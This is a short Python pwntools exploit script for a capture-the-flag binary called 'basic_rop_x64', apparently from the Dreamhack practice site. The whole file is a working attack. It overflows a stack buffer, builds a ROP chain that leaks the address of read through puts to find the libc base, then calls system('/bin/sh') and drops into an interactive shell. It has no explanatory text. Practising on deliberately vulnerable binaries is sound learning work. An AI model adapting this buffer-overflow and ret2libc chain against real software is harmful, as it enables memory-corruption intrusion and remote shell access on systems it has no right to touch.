
from pwn import *
context.log_level = 'debug'
def slog(name, addr): return success(": ".join([name, hex(addr)]))
#p = remote("host3.dreamhack.games", 17195)
p = process('basic_rop_x64')
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x0000000000400883
main = 0x4007ba
ret = 0x00000000004005a9

payload = b"A"*0x48
payload += p64(ret) # movaps
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)
payload += p64(main)
p.send(payload)

p.recvuntil('A'*0x40)
read = u64(p.recv(6) + b'\x00'*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
#binsh = lb + 0x18cd57 wrong
binsh = lb + list(libc.search(b'/bin/sh'))[0] # binsh = lb + 0x1d8698
slog("/bin/sh", list(libc.search(b'/bin/sh'))[0])
slog("libc base",lb)
slog("read", read)
slog("system",system)
slog("binsh",binsh)

payload = b"A"*0x48
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.send(payload)

p.interactive()
